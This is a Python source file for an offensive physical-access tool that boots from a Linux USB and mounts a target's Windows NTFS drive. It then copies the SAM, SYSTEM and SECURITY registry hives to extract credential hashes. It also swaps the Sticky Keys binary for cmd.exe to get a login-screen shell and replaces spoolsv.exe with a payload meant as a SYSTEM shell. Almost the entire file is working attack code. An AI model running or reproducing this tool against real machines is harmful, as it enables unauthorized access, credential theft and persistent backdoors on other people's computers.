#!/usr/bin/env python3 

# Author: Keenan Kunzelman
# Description: Meant to be run on a linux bootable usb. Program scans 
# for all connected storage devices and looks for specific 
# file systems to mount and then exfils data. Only looks for NTFS 
#and exfils the calc.exe program for now.

#TO DO
#[] Create Implanter class that abstracts shared behaviour between attacks
#[] Allow Implanter to accept necessary paths for attack.
#   Can we make an generic cleaner that reverses any implants?
#[] Create method / mechanism in Implanter for payload/attack choice
#[] Abstract Drive / improve it, and then implement windows drive class that
#   inherits from it



import sys, subprocess, argparse, time, shutil, os, datetime


class Drive:
# Stored data from a raw drive in a more accessible format.
# set_source sets the path that the drive is located at
# set_fs stores the file system for the drive
# get_source returns the path that the drive is located at
# is_mounted checks to see if the drive is mounted or not
    # If the drive is mounted 'yes' is returned
    # If the drive is not mounted 'no' is returned
    # THIS IS DUMB AS SHIT AND SHOULD BE A BOOLEAN

    def __init__(self):
        self.source = '' 
        self.fs = '' 
    def set_source(self, source):
        self.source = source
    def set_fs(self, fs):
        self.fs = fs
    def get_source(self):
        return self.source
    def get_fs(self):
        return self.fs
    def is_mounted(self):
        proc = subprocess.Popen('sudo mount', 
                stdout=subprocess.PIPE, shell=True)
        (mounted_drives, err) = proc.communicate()
        mounted_drives = mounted_drives.decode('utf-8')     
        if self.get_source() in mounted_drives:
            return 'yes'
        else:
            return 'no'


# Run the command sudo blkid and then recieve its output as a bytes
# Decode using utf-8 and then split on \n
# Returns a list of drive paths and their file systems
def grab_drives():
    proc = subprocess.Popen('sudo blkid', stdout=subprocess.PIPE, 
            shell=True)
    (drives, err) = proc.communicate()
    drives = drives.decode('utf-8').split('\n')
    return drives


# extracts the drives with ntfs types
# returns a list of windows drives
def locate_winfs(drives):
    win_drives = []
    for drive in drives:
        if 'ntfs' in drive:
            win_drives.append(drive)
    return win_drives

 
def mount_drive(drive):
    # accepts a path to a drive that you would like to mount
    # mounts the target drive to /mna/windows
    # if /windows does not exist, smugglebus will try to make it for you
    try:
        os.mkdir('/mnt/windows')
        print('/mnt/windows has been created for you, and will'
                ' be used as a mounting point')
    except PermissionError:
        print('was unable to create mountpoint. Please run '
                'hashsnatcher as root.')
        sys.exit()
    except FileExistsError:
        print('/mnt/windows exists, and will be used as a '
                'mounting point')
    pipe = subprocess.Popen('sudo ntfs-3g -o remove_hiberfile {} '
            '/mnt/windows'.format(drive.get_source()),stdout=subprocess.PIPE, shell=True)
    time.sleep(1)


def locate_target_file(*target_dirs):

    sanatized_path = ['/mnt', 'windows']
    for target_dir in target_dirs:
        # this is named current assets because it can be a file or dir.
        current_assets = os.listdir("/".join(sanatized_path))
        if len(current_assets) == 0:
            print('\n\nlooks like the volume didnt mount because windows fs is in'
            ' a shitty state')
            print('exiting...')
            time.sleep(1)
            sys.exit()
        for current_asset in current_assets:
            if target_dir.casefold() == current_asset.casefold():  
                sanatized_path.append(current_asset)

    return "/".join(sanatized_path)


def get_sticky_shell():
    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool
    absolute_sticky_keyz_path = locate_target_file('windows', 'system32', 'sethc.exe')
    
    try:
        shutil.copyfile(absolute_sticky_keyz_path, 
                (absolute_sticky_keyz_path + '.bak')) 

    except FileNotFoundError as e:
        print(e)
        print(absolute_sticky_keyz_path + ' was not found')

    absolute_cmd_path = locate_target_file('windows', 'system32', 'cmd.exe')

    print(absolute_cmd_path)
    try:
        shutil.copyfile(absolute_cmd_path, absolute_sticky_keyz_path)

    except FileNotFoundError as e:
        print(e)
        print(absolute_cmd_path + ' was not found')

    print('stickykeyz binary has been succesfully swapped with cmd.exe')
    # optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /mnt/windows', shell=True)
    print('Drive has been unmounted from /mnt/windows')


def revert_sticky_shell():
    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool

    absolute_sticky_keyz_path = locate_target_file('windows', 'system32', 
            'sethc.exe')
    absolute_sticky_keyz_bak_path = locate_target_file('windows', 'system32', 
            'sethc.exe.bak')
    try:
        shutil.copyfile(absolute_sticky_keyz_bak_path, absolute_sticky_keyz_path)
    except FileNotFoundError as e:
        print(e)
        print(absolute_sticky_keyz_bak_path + 'was not found')

    os.remove(absolute_sticky_keyz_bak_path)

    print('stickykeyz binary has been succesfully restored')
    # optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /mnt/windows', shell=True)
    print('Drive has been unmounted from /mnt/windows')



def implant_SYSTEM_shell():
    absolute_spoolsv_path =  locate_target_file('windows',
                                    'system32',
                                    'spoolsv.exe')
    try:
        shutil.copyfile(absolute_spoolsv_path, (absolute_spoolsv_path + '.bak')) 

    except FileNotFoundError as e:
        print(e)
        print(absolute_spoolsv_path + ' was not found')
    try:
        shutil.copyfile('/home/tc/payloads/spoolsv.exe', absolute_spoolsv_path)
    except e:
        print(e)

def remove_SYSTEM_shell():
    absolute_spoolsv_bak_path = locate_target_file('windows',
                                        'system32',
                                        'spoolsv.exe.bak')
    absolute_spoolsv_path =  locate_target_file('windows',
                                        'system32',
                                        'spoolsv.exe')
    try:
        shutil.copyfile(absolute_spoolsv_bak_path,absolute_spoolsv_path)
    except e:
        print(e)

def locate_start_bak():
    pass
def implant_userland_shell():
    absolute_start_path = locate_target_file('windows',
                                        'programdata',
                                        'microsoft',
                                        'windows'
                                        'start menu',
                                        'programs',
                                        'startup',
                                        'start.exe'
                                        )
    pass
def remove_userland_shell():
    pass


def copy_registries():
    # gotta use the mount point made by mount_drive here from the 
    # user input i should implement some code that suggests a drive 
    # to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool
    registry_names = ['sam','system','security','software']
    absolute_registry_paths = []
    for registry_name in registry_names:
        absolute_registry_paths.append(locate_target_file('windows', 
                'system32', 
                'config', 
                registry_name))
    
    stamp = str(datetime.datetime.now().timestamp())
    directory = '{}/hives_{}'.format(os.getcwd(), stamp[:10])
    os.mkdir(directory) 

    for path in absolute_registry_paths:
        try:
            shutil.copyfile(path, 
                    '{}/{}'.format(directory, path.split('/').pop()))
        except FileNotFoundError as e:
            print('{} not found'.format(path))

    print('registry hives have been succesfully exfiltrated to your pwd')
    # optimize this...
    time.sleep(1)
    subprocess.Popen('sudo umount /mnt/windows', shell=True)
    print('Drive has been unmounted from /mnt/windows')

def store_drives(raw_drives):
    # takes as input raw_drives from the blkid command
    # Returns a list of Drive objects

    connected_drives = []
    for i in range(len(raw_drives)):
        temp_drive = Drive()
        temp_raw_drive = raw_drives[i].split()
        for attribute in temp_raw_drive:
            if '/dev' in attribute:         
                attribute = list(attribute)
                attribute.pop()
                attribute = ''.join(attribute)
                temp_drive.set_source(attribute)     
            elif 'TYPE' in attribute:
                temp_drive.set_fs(attribute)
        connected_drives.append(temp_drive)
    return connected_drives 

def check_for_windrives(raw_drives):
    #looking back this code is actually so trash. Gotta refactor.
    drive_count = 0
    raw_win_drives = locate_winfs(raw_drives)
    win_drives = store_drives(raw_win_drives)
    #not the happiest with this code but it works
    if len(raw_win_drives) < 1:
        print('no exploitable drives')
        return False
    else:
        print('\nConected drives using the NTFS file system.\n')
        for drive in raw_win_drives:
            print('[Drive {}] {}\n'.format(drive_count, drive))
            drive_count += 1
        target = input('\n========================================='
                '===============\nplease choose a drive to exploit.'
                ' Note drives start at 0\n\nDrive ')
        print('****************************************************'
                '*****************************************')
        print('Targeting: ' + raw_win_drives[int(target)])
        mount_drive(win_drives[int(target)])
        return True

def pretty_print(drives):
    # takes as input an instance of the Drive class and prints
    # out useful data about the given drive.

    # subprocess.call('cat assets/ascii_art', shell=True)
    print('\n\n     *******************************************************'
            '***************     ',
    end ='')
    print('\n     *******************A TABLE OF ALL CONNECTED'
            ' DRIVES*******************', 
            end ='')
    print('\n     *******************************************************'
            '***************     ',
            end ='')
    print('\n     *\t\t Drive Location\t      File System\t'
            'Mounted\t\t  *',end ='')
    for drive in drives:
        if len(drive.get_source()) > 10:
            print('\n     *\t\t   {}      {}\t  '
                    '{}\t\t  *'.format(drive.get_source(), 
                        drive.get_fs(), drive.is_mounted()), end='')

        if len(drive.get_fs()) > 6 and len(drive.get_source()) < 10:
            print('\n     *\t\t   {}\t      {}\t  '
                    '{}\t\t  *'.format(drive.get_source(), 
                        drive.get_fs(), drive.is_mounted()), end='')
        elif len(drive.get_fs()) == 4:
            print('\n     *  {}\t      {}\t  '
                    '{}\t\t  *'.format(drive.get_source(), 
                        drive.get_fs(), drive.is_mounted()), end='')
    print('\n     *******************************************************'
            '***************     ',
            end ='\n')

def main():

    parser = argparse.ArgumentParser(
            description=('Choose which mode to run program in. No '
            'input lists all the storage devices.'))
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-xh', '--extract_hives', action='store_true')
    group.add_argument('-pd', '--print_drives', action='store_true')
    group.add_argument('-sk', '--sticky_keyz', action='store_true')
    group.add_argument('-rsk', '--remove_sticky_keyz', action='store_true')
    group.add_argument('-rss', '--remove_system_shell', action='store_true')
    group.add_argument('-ss', '--system_shell', action='store_true')

    args = parser.parse_args()

    # this grabs the raw text for the connected drives
    raw_drives = grab_drives()
    # this stores the raw drived as a Drive obj.
    conected_drives = store_drives(raw_drives)
    if args.extract_hives:
        if check_for_windrives(raw_drives):
            copy_registries()
    if args.print_drives:
        pretty_print(conected_drives)
    elif args.sticky_keyz:
        if check_for_windrives(raw_drives):
            get_sticky_shell()
    elif args.remove_sticky_keyz:
        if check_for_windrives(raw_drives):
            revert_sticky_shell()
    elif args.system_shell:
        if check_for_windrives(raw_drives):
            implant_SYSTEM_shell()
    elif args.remove_system_shell:
        if check_for_windrives(raw_drives):
            remove_system_shell()

if __name__ == '__main__':
    main()
    
# shit get cached in hybernation file?
